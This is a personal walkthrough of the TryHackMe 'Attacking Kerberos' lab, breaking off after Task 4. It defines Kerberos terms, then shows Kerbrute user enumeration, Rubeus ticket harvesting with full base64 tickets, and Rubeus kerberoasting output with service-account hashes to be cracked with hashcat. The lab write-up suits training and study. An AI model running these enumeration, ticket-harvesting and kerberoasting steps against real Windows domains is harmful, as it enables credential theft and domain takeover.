---
title: TryHackMe - Attacking Kerberos
published: true
---

[https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)

Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller

![](/assets/kerberos01.png)

* * *

## [](#header-2)Task 1 - Introduction 

**This room will cover:**

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

**Notes:**

- Kerberos is the default authentication service for Windows domains.
- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### [](#header-3)Kerberos Authentication Overview

![](/assets/kerberos02.png)

- AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
- AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
- TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
- TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
- AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
- AP-REP - 6.) The service grants access

##### [](#header-5)Answer the questions below

**What does TGT stand for?**

- Ticket Granting Ticket

**What does SPN stand for?**

- Service Principal Name

**What does PAC stand for?**

- Privilege attribute certificate

**What two services make up the KDC?**

- AS, TGS

* * * 

## [](#header-2)Task 2 - Enumeration w/ Kerbrute 

![](/assets/kerbrute03.png)

sudo /opt/kerbrute/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

```shell
┌──(0xskar㉿cocokali)-[~/thm/attackingkerberos]
└─$ sudo /opt/kerbrute/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/20/22 - Ronnie Flathers @ropnop

2022/06/20 11:46:28 >  Using KDC(s):
2022/06/20 11:46:28 >   CONTROLLER.local:88

2022/06/20 11:46:28 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2022/06/20 11:46:29 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2022/06/20 11:46:29 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2022/06/20 11:46:30 >  Done! Tested 100 usernames (10 valid) in 1.887 seconds
```

##### [](#header-5)Answer the questions below

**How many total users do we enumerate?**

- 10

**What is the SQL service account name?**

- sqlservice

**What is the second "machine" account name?**

- machine2

**What is the third "user" account name?**

- user3

* * * 

## [](#header-2)Task 3 - Harvesting & Brute-Forcing Tickets w/ Rubeus 

```shell
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _                       
  (_____ \      | |                                   
   _____) )_   _| |__  _____ _   _  ___               
  |  __  /| | | |  _ \| ___ | | | |/___)              
  | |  \ \| |_| | |_) ) ____| |_| |___ |              
  |_|   |_|____/|____/|_____)____/(___/               
                                                      
  v1.5.0                                              
                                                      
[*] Action: TGT Harvesting (with auto-renewal)        
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (6/20/2022 11:51:18 AM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
  StartTime             :  6/20/2022 11:26:37 AM                                                         
  EndTime               :  6/20/2022 9:26:37 PM                                                          
  RenewTill             :  6/27/2022 11:26:37 AM                                                         
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEjTlK3cJIXALbz0AP/5+JKkMuwRXYj9pEwsw 
    wBWjxBRQTVgXRL90hT/Et+ePfbnscez3dkP5avarW2I3WuQpsmU5dhtUzzeuZUpOl2AnKLuHXGUylOsLoaM2HTwNCzJIs/j3HGPL 
    LSIo/HI/w0P5sBX/BLhHRUt85OUo267foX40cFNJSmsAo9qRWAGrmiryv+scgGjXH/ZoF1AbFJowu+/3BtZrxN8PAEgNYbwLS2qm 
    rCPdBnQs5u9w66+uLhvY2cXKPUAW5vpUWGkdSm7eXhHlNwyQ5ecOtUICJag2++dO9mWhYz38PpqXIZjI7cAF5skaluWY+cFGt0OB 
    qwgV/UbN/6AMkh3eZFbbvtLV05jPdEVZnQ7BuNftd/4NZWEHCjvv7efWCgkIJ7SsWbboGqwiCg3PeXlPS3O2Rn44pIRxpvsyhT4+ 
    EGaipgcu51o+FPTRY/YwLTqHj50fUHIPMH0IgRASs+Ko9iMyOF1Eac2C7hNHu8zRwn3cUhVWY97ZKKM4lEj5kRfeMhddYJFrb8yU 
    nLY9jHEYAw4Cf87zd5X1Dfa4V16nujxdzztHgMeEnaUCLPgPEWHlCuszYCYRyJ4IvQaprUsVfsNnmIIjzvzWAX5gVuBgvCPxBr7F 
    nO/3s0ejL5Nssp8aKrHUgOqY2u3tYEjZ1oMiL0Pbh0/y8kEF1aeQ6oVyBe96zAFRS8OWK/eWA44mhBAQaQ1bHaZXUc1a0R8D9eWC 
    28vqqkPfX4JAt4uM3XGqlAvysFdqz4fY/wCkXuCcHkUGSTzzUK+dtYYymezQzDcgWhnikVKDUbU6PzvtReEXAe2G2QEwpmaUSn9u 
    AzZniEfBWwaKDnbmCr7a3LTLogo4dLX98DvtDnC9cjBGNqMRVaz0z43+OvM+hRCeh1HDVR2fdxlUf8GvP/robPFHpGtLfI4KD2yE 
    YnGLmpixqHEraw03TavjmGGi17pHV3rGMrUb+IC7JdUPg2ls3s2qwOIW19d63M8lDbccTHhuJQ0kLpJfs/II5MtufAI3qU83DfX+ 
    x+S5psT5YfYOWI42NGDyntaPISGepKKwY3CT1hIhAt3agUv5wjFyMd0BY1G1PyhvW6vX9IW5fVJqhwUujZYPz7/PchFgQz7k7JtF 
    DXlPzn4dsTCB9a1z7eMtD9mdAAvIPubu/Z69TsscfNxGSHwn6uiCWv11cJdGhT759gfqBY4unjBVelqjUSK0Qv9nfw88VhDLgSg5 
    Q8cBMvXyVxMxvlJTXLw+SNApqsF4zzCjgr+LuRb146geUI27I0bXPFcsr9k13ihH2L6nlExKaQiBBmvAeu26BxtCicpLCEKOZ+Os 
    lv5Ee6yhZWoO8qpwod9Mi/k5QLugXOb9ghs9s6zBju6FH9CALMNcYVSjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr 
    MCmgAwIBEqEiBCDrTZoy9U6bFkbBujbFgP0FP9Jh6LXAxX2YEgg75PW4PqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw 
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDYyMDE4MjYzN1qmERgPMjAyMjA2MjEwNDI2MzdapxEYDzIwMjIwNjI3 
    MTgyNjM3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM 

  User                  :  Administrator@CONTROLLER.LOCAL                                                
  StartTime             :  6/20/2022 11:48:58 AM                                                         
  EndTime               :  6/20/2022 9:48:58 PM                                                          
  RenewTill             :  6/27/2022 11:48:58 AM                                                         
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGjJica1+uKqjFMSztPTcnK4EqCpqClW2I6ZU
    fJmjMzWtKQopVktGvROpJNuKuMX1SxU7A+NZuRpF5NfFHrj5Y1qxXJrCTHcgcfL7NOA4nAnrElPLcyufXGP87HpZsJpagqW99cAi
    +XqSXOomtZYyJNIZlkeSvi+Ug8OXKE0EGKngU7BR5x927akYWKgAiOPy7l11/Gjp2qcPt3u2ut6Ik2DFYDIeKAVsPYf4i1/uuV7f
    MgjlzODyBo1m3/73KMW2nBhDWzgokegvVXOSbHc8Umx4+wE/osEZD41V2yivgVGR/OE1HmlXdnt6pmm5pN7W063uHRCoJaj711T5
    Cy1vZlOEnBtqIsG89fxYv/Y4bjVtDwIyk9jugEr3hh9tsmCOmDUvXlw00LQvfUxPxWyYEmTzsvBQ+AEA15lW9LeaJ+OlWtLWM1wc
    q9whjptAwHOnTZM+X1CNII0Cy5l5FjZ349XsfX0EHgsiVvUnc/TafRE047fy2cVnthJL9nqqjDJsWa1WKkqot8ic4Mi1cgjqHEES
    HH5EcnP9B+7R0L/FPUv/q9FeKqlaObRCbO0g7RGaTOZ6OSG/G/VdnS5ynCBprySLpbmLCcGumsdZvGuE7HIO9E1u+/6tMTtZ6z9u
    AVXF+P4mE4yTSKz3x/wQZfp5nlthsXfGTMpVxM9dnc3OHbBDBMT5PcQsswWL6b7P8awH5JY8Mmz4Yz6sb3i6ERMG5RJ3gF7AcWRx
    n31pTP66iICPUuJW02cKbretMGA7WKvTCHmCu33SYFJWpiJH/Iq1rw21rDCIXgFzsQJTFZSE437SvvttbB9tU7X9h4mmW34zMiu6
    yK/0qJ4ULA+1A8IwN6MduyL7akEbP+p+EUpPbjCe2YV/OQrOwwXl7SoSC9cV+r4sc6j2dRAsVE0oYHkWYsmtBFle6hk/dg1/fAcE
    8iDmBlShWafPHgMlv7PETiAyqhffsb172RD0q9x4sOtwo4inf2tqKQj+SH7DXzIY1xpVcbYqhAKTOEfzF0mU08cIlY2XEeKy40HD
    t5KtbMzmvqfQBhB3iCRqhvwZlRsjvz4NusRt29B+0qXipHeaRUOURzjnICLye5Y9gr/emjWxxA3KqV0rXDXLMFMJnJrs1R2pU0Fr
    7OVnGWw0D38VqCQqF0bLk4KYAShax0yQjjzPqCtBY80lw8Cz8utpvVT4/lFD5y8Ll39Ih3r0XShVjhgRsgDxcSHauxisvmGzujeC
    7EXN1KHB0q908DeVxCUb5ZyKKM3lovOU2KvjWi3+0eUUh4ygN0RRO3XfxRN5SRXhDRqd2vvU+W3cT+Ja7ysd9JXxRMfxtEasj8TB
    aspkcPndgdTmkymBVnhpQYP8vq575JPdi6ubwbih+qSHOxe0Q/q+fAyPI4Fn31dL6KOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIC5U5R1rNWqxS6JJvQAVLtJLsd9U1zkREEuSTD8h1esjoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwNjIwMTg0ODU4WqYRGA8yMDIyMDYyMTA0NDg1OFqnERgP
    MjAyMjA2MjcxODQ4NThaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

```

##### [](#header-5)Answer the questions below

**Which domain admin do we get a ticket for when harvesting tickets?**

- Administrator

**Which domain controller do we get a ticket for when harvesting tickets?**

- CONTROLLER-1

* * * 

## [](#header-2)Task 4 - Kerberoasting w/ Rubeus & Impacket 

```shell
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca
                             l:30111*$C8D4E61D6C3E7336C7CE1A6342802A83$FD825B0910643989C012C9223AEA9FA509A23E
                             DE4889781D6F42DDBFCB907F779F7A31A5CFEBA8908193B2A0EEA5BCACA6634D671C862101FE85C5
                             00F13E3E994B6A6A636DAA0A73C7C3BE21BB87C4E63190DE7FEAF3FEAE4DE1E8D22B62CD8F5B695A
                             3E1E16A632222DEEE51E712EE9A6F99A03ACD1B38FE1DC1A1B82968DB4E6738D40337EA0D4A09E8D
                             3000BA9AEB0D6B9924AC2109D801757B9D01C92F31305B5CAD0D974CFA4D6D384F81A78FFAD16A23
                             0CEDE933AF9BE6DCB3D825B78877F7979F1A9427DDBE04B499121DA12B455893CCF6D862B55067C2
                             A1B030D88F9638FE6B1C935F6C2C9E11E52E39C5BDD0B22704416649E3B5F30BDFBE36D7A20BC613
                             DD8AEA7D2D396F394E9C92980A0061B14C08B0D6BA254566CC2C4C57C1107308F2558A26D2C79CCD
                             3E457BA7188D0D631E857D1D703F37D81220378A02112AD6840A68EC200D132ADA8D5FD2AFF01844
                             AD6D5EA327B8A097BB2F6C507690228551323FF7C6B17C92D8826B7D6983556E7E431B2920E9FA17
                             BE43C9310494FCD46388213F736624357FE55EC325F5670A7A5107FAE2A02D19662252E6EB04FD31
                             6293BECD7DB97E2F6505A9642E5F315110D726108079DF32EDF088BBD1144ABDE82BF8F20FD83CB0
                             A72C8B345CCC67C36938A9B44D793B40B78E95DC8654F3C5CDC736EF8F1B568D7C811AA48D0522EF
                             9302F2D1A2E3EBA361DBEBE9405E0F2E068B878A25F0FC3E313FA9A57334BB857E693D28AC972AC3
                             FB5A3321A63FA16052A945853E4948109A76A112FEAE134F978F351C1B333E16861FC5F7832B0920
                             356B5FA5511384C256B732473EDEF89B9CCD227EE385EA58F080F11B6DDDADDE85DD67A1DC734C64
                             291A6DB85865164B09DD783D1575F6CBB9677DDC99D78F5F3567C53ED7B6E5FC81CD07FC5C7D9BBE
                             C691F8F8751A3D42A86CD13F37592E8F7F1E8358E3AAC6957ECEF598F0BF09605D00C9BE649393D5
                             7028D458198208ADB59B1953BA0D97165B8511CD65C9B1E2958B49E53886805A60C94177F729ABC5
                             46ED2526AEFA5CDB548306D14BEF66A625CE8BB6FA4B227A66F2A0FAC6891AEE89CC9D572F084C49
                             2F744ADB22A73873FBE1365651AF85D033A4082C28EA39CFD57FCC145545F90ACBAC535585776DB4
                             3D901DD3603872BB68C12497C6DBD811C6A76D5FCEA22435E8A553E505111E39C8FE93B7B34A8162
                             1A4874F16D7CEC6978BD2F4E1F4849B8FDDBEF5FF2FBA276E831926666A5BF008C4FB80001D2E1E7
                             568CAAB5C6F8E14FA68428FD528B6DF1B3155BCBB03A44EFD3FC48BAD835EA91E5DE4B5BAF76A11A
                             E6CFDCCA7C1001C761A604BEC77F8EEB527BCC267AF8FE8D650ADDFD851C041D10976233F60EEC27
                             774B24975A8B648530BB9E32D8D44A95105E371D0A822C8374EB810ED7E1B3C8BDF34481F5AFDD48
                             CCB3FD6A51DB228674B559CF7CA4306A40B03AE00121CC52D3B6DAF355B9F05CC4AAEE655EDD481D
                             FF4BBB2A7F538ECAB238DB32A431A484C5F1E3803060C9CB91E613BD68ED78ED8486D1069D17A412
                             EAB089C0047112CD858D5949586093053BAFA2AFD35512F8763A1E9F3AEAACFA6F77C1F290919D08
                             6939834EB06470A1ED7E09F2C81766B1BFC3CC2D70488E839265F0752A


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$651A12872D59E72EC4DB3E201B8EEEB6$650946ECD770015D25089B011B5A953B091F
                             5D5F26D259094E11AC76639170CBC53E99BBE7AAF9CB4447B666D7E76FE41FBDD70B1D05A46B2A18
                             F40AF1156A49663E59D1213BE9E7B55F1F9CB14E491AB91D14D2DF872E8C6F498CA8C8AEAA81DE8A
                             0B924A8AC361F427A7C8E68588D6269FEBB9BC09AA6F23954C54E95AE5B26B21457AAA34484D15E1
                             43563304A9076AC0BCB0B8CD7DCA599CE0717B6E908F6EF5E211E84AFBB5B60F52B7253CD05367C8
                             0EA07F4427E06CFF6EE0F9AB47CD4C66F4AE7A8B64A148268C5359FD5AEA99650C6E1CC9CA82E2E5
                             2A8B70AD6291B9CC5F96E9AC83681197642A133A1C0A306CB9D6C24903BAB3B372A3F74041A72CF9
                             8F236DF3B944301C12533EE3B3293DFAFAAE97D903761C1A754F38DEB585CC1610E2A8003A09D337
                             C14EBE966C5BB1DCEDEB26C06CC8178505E4928B1AF1D35A72AF2D0C469D221CB304D498C34DA981
                             3C066ADE73776FA80DC242BBF1F8533E8E42B11AE8E2654D7FD752794EB3148775B5191852802290
                             388D514494AB300B1F5C606FEF5B1030AB370085DFBEEE8E673226A22804A6959953D96D6C169301
                             C1845C6BBF7E6E303FE253F911CC3F18A9E988B2E08979AC6F00A3D9D0459C3AC9612F638BDD8841
                             393B5FB3D8192FB5474B080C17B9D640CBE79FB9D6FEE40B969DCBFDA48B43A8D6E8B4734BFA33E2
                             26E5B1E5F3888DCFD6E381B72B9A6325C297E20B101A6141E40F3F3B38559FDFA962E97F5143C3C6
                             A2A5E82C8BD70226552613AF1AEF4ED7A299E6795994BE95568A957C638B24C106EA20F464467A68
                             72BB16D9291411C8EB6261FCE404246074A41094B66AE7660E9A889D322304DD6A552CD1BD392F33
                             B14C6A83B61C2ACC5F09C28A2F6F36EDFA1412D70A261361263FD4F3B8D2619CCDC1454CF0C968D3
                             2C9127BEDD686CF3EBD362C45F29D6686DF96A8B7658615360029179ACFAB64667A2AACDE8F59796
                             A539720AAC856257FC565702D6CE84F35EC67F870D64FE6B00C7FA874F2806DAFBEB926B1CEDA1F2
                             27C4A70AD81D5B154D379A649470BA5006A8201C0706853EC53108558086BC8F7DAA99F31BF10930
                             46F64AED90BF8D118D9B4D347E0DD9A5297874036DF3CDD299FAFFB5E2F9C212450E79BF34398E7E
                             3BA934A813B06A40B5D9246198214063D1EA49088CA98952F6463768836C0A8C12143517BC63EFA1
                             B0BE69BBCC350BBF370C0CB04765246A8DD8442F79F25D7CDCF9221266E0B4830C9EDDE007F93CD0
                             284BA2D58FD85DFB115420AB2FAC7427804AA2035F29CF738E919F5A5D83794EFA84EF994ABBB050
                             236C9A6A8E472F7E8A3ABA390FA0242B47048E6E1D391DFDAD47831BD16D91742C5590391F5D8D7D
                             ADAC4DE64F0ED23EDA87BC1FC258F97C4439A9C148A9662753BF8C4F680F98B92F09BE089E0EC770
                             EC8815A7A64F0AEBB0DB2DF6F3BD0FF5A31B144454711DE53B5F95C6C51A3818DACD35DC70CEB47F
                             4A3213A44677E97690169AE902061B610250D1574DF5AB95D9EFF6B560E95DA6814E97A330E35880
                             A3A3427B52A0ED5BD19E2D54D094CBC5D8FD0CF2402411A5EBE8D4150418B2255047E2973B6F2441
                             EC9498A1499BFA94DD0D6435C1743C6A6FC13490ED730E6A223724DEAB9E
```

- Copy hash to attacker machine and feed to hashcat with modified rockyou wordlist.
- 
